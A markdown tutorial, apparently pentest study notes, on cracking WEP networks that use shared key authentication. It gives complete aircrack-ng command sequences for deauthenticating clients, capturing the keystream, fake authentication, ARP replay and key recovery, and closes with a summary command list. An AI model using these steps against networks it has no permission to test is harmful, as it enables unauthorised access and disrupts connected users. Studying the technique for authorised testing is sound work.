# WEP bypassing shared key authentication

Shared key authentication requires that the station and AP both have the same WEP key in order to authenticate. 
If you try to run a fake authentication attack against a WEP network using shared authentication, you will receive an error from Aireplay.

## Setup attack 


```
airmon-ng start wlan0 6
airodump-ng -c 6 --bssid 00:22:3F:B5:AF:36 -w wepshared mon0
``

## Get the PRGA XOR file to be able to fake authenticate 

For shared key authentication, the PRGA XOR file needs to be captured as the client connects to the network. Can either be patient, or can capture by deauthenticating a client. 

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

airodump-ng will display that it had captured the keystream. 

Now fake authenticate with the AP by passing it the PRGA XOR file in the -y parameter. 
```
aireplay-ng -1 0 -e <ESSID> -y <sharedkey> -a <AP MAC> -h <Your MAC> <interface>
```

## Run the ARP request replay attack to generate multiple IV's

Now that we have authenticated with the AP and overcome the Shared Key Authentication issue, we can use the ARP request replay attack to generate IV's. 

```
aireplay-ng -3 -b <AP MAC> -h <Client MAC> <interface>
```

In order to speed up the ARP packet, we can deauthenticate one of the clients as it is likely an ARP packet will be sent once they recconnect. 

```
aireplay-ng -0 1 -a <AP MAC> -c <Connected valid Client MAC> mon0
```

Run aircrack-ng to get the key
```
aircrack-ng <file_name.cap>
```

## Summary 

Place your wireless card into monitor mode on the channel number of the AP:
Start an Airodump-ng capture, filtering on the AP channel and BSSID, saving the capture:
Deauthenticate the connected client to capture the PRGA XOR keystream:
Conduct a fake shared key authentication using the XOR keystream:
Launch the ARP request replay attack:
Deauthenticate the victim client again to force the generation of an ARP packet:
Once IVs are being generated by the AP, run Aircrack-ng against the capture:

```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
aireplay-ng -1 0 -e <ESSID> -y <keystream file> -a <AP MAC> -h <Your MAC> <interface>
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
aircrack-ng <capture>
```
